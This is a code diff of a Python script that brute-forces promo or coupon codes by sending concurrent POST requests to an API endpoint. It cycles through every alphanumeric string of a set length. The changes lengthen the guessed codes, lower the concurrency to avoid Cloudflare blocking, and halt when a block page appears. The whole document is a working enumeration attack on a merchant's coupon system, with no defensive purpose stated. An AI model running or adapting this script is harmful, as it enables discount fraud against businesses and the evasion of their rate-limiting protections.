@@ -31,7 +31,7 @@ stringType = "1234567890abcdefghijklmnopqrstuvwxyz"
 
 sys.stdout = open('promo', 'w')
 
-pool = Pool(50)
+pool = Pool(30)
 
 
 # def callAPI(code):
@@ -52,7 +52,7 @@ def tryPassword(stringTypeSet):
     attempts = 0
     count = 0
     futures = []
-    for i in range(2, 3):
+    for i in range(3, 4):
         for letter in itertools.product(chars, repeat=i):
             attempts += 1
             letter = ''.join(letter)
@@ -61,7 +61,7 @@ def tryPassword(stringTypeSet):
                     'coupon_code': letter
                     }
             # callAPI(letter)
-            if count < 50:
+            if count < 30:
                 futures.append(pool.apply_async(requests.post, [API_ENDPOINT], dict(data=data, headers=headers)))
                 count += 1
             else:
@@ -69,7 +69,8 @@ def tryPassword(stringTypeSet):
                     # extracting response text
                     pastebin_url = future.get().text
                     print(pastebin_url)
-                    print(letter)
+                    if "Cloudflare" in pastebin_url or '�' in pastebin_url:
+                        raise Exception("OH shit")
                     if "does not exist" not in pastebin_url:
                         print("CHECK THIS!")
                     # finished and then print the response object.
